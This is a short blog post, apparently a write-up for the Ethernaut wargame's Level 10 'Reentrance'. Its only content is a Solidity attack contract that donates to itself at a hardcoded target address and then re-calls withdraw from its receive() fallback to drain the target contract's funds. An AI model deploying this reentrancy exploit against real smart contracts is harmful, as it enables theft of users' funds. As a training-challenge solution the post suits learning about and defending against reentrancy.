+++
title = 'Ethernaut Level 10 - Reentrance'
date = 2024-08-04
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'Reentrance Attack - recursive winning'
tags = [ 'writeups' , 'blockchain' ]
+++

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
    function donate(address _to) external  payable;
    function balanceOf(address _who) external  view returns (uint256 balance);
    function withdraw(uint256 _amount) external ;
} 


contract Attack {
    Reentrance target = Reentrance(0xBE2d56c354dD97062916A849d36ECC57281aC38a);
    constructor() payable { 
        // Donate to self
        target.donate{value:1000000000000000}(address(this));
    }

    // Trigger Reentrance loop
    function pwn() public  {
        target.withdraw(1000000000000000);
    }

    // Reentrance to drain all the funds
    receive()  external payable { 
        target.withdraw(msg.value);
    }
}
```